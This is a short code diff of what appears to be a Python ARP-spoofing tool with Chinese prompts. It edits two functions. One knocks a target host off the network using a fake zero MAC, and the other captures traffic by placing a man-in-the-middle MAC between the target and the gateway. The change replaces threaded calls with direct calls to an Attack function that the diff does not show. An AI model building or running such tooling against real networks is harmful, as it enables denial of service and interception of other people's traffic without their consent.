@@ -12,12 +12,13 @@ def DisconnectTarget():
     gateway_mac = input("请输入网关MAC:")
     fake_mac = "00-00-00-00-00-00"
     timebreak = 0
-    thread = threading.Thread(target=Attack, args=(target_ip, target_mac, gateway_ip, gateway_mac, fake_mac, timebreak), daemon=True)
-    thread1 = threading.Thread(target=Attack, args=(gateway_ip, gateway_mac, target_ip, target_mac, fake_mac, timebreak), daemon=True)
-    thread2 = threading.Thread(target=Attack, args=(target_ip, target_mac, gateway_ip, gateway_mac, fake_mac, timebreak), daemon=True)
-    thread.start()
-    thread1.start()
-    thread2.start()
+    # thread = threading.Thread(target=Attack, args=(target_ip, target_mac, gateway_ip, gateway_mac, fake_mac, timebreak), daemon=True)
+    # thread1 = threading.Thread(target=Attack, args=(gateway_ip, gateway_mac, target_ip, target_mac, fake_mac, timebreak), daemon=True)
+    # thread2 = threading.Thread(target=Attack, args=(target_ip, target_mac, gateway_ip, gateway_mac, fake_mac, timebreak), daemon=True)
+    # thread.start()
+    # thread1.start()
+    # thread2.start()
+    Attack(target_ip, target_mac, gateway_ip, gateway_mac, fake_mac, timebreak)
 
 def OpenRoute():
     input("开启/关闭路由请以管理员的身份运行脚本，否则会闪退，你明白了吗？\ny/n")
@@ -35,10 +36,11 @@ def CapturePacket():
     gateway_mac = input("请输入网关MAC:")
     fake_mac = input("请输入中间人MAC:")
     timebreak = 1
-    thread = threading.Thread(target=Attack, args=(target_ip, target_mac, gateway_ip, gateway_mac, fake_mac, timebreak))
-    thread1 = threading.Thread(target=Attack, args=(gateway_ip, gateway_mac, target_ip, target_mac, fake_mac, timebreak))
-    thread.start()
-    thread1.start()
+    # thread = threading.Thread(target=Attack, args=(target_ip, target_mac, gateway_ip, gateway_mac, fake_mac, timebreak))
+    # thread1 = threading.Thread(target=Attack, args=(gateway_ip, gateway_mac, target_ip, target_mac, fake_mac, timebreak))
+    # thread.start()
+    # thread1.start()
+    Attack(target_ip, target_mac, gateway_ip, gateway_mac, fake_mac, timebreak)
 
 
 if __name__ == "__main__":
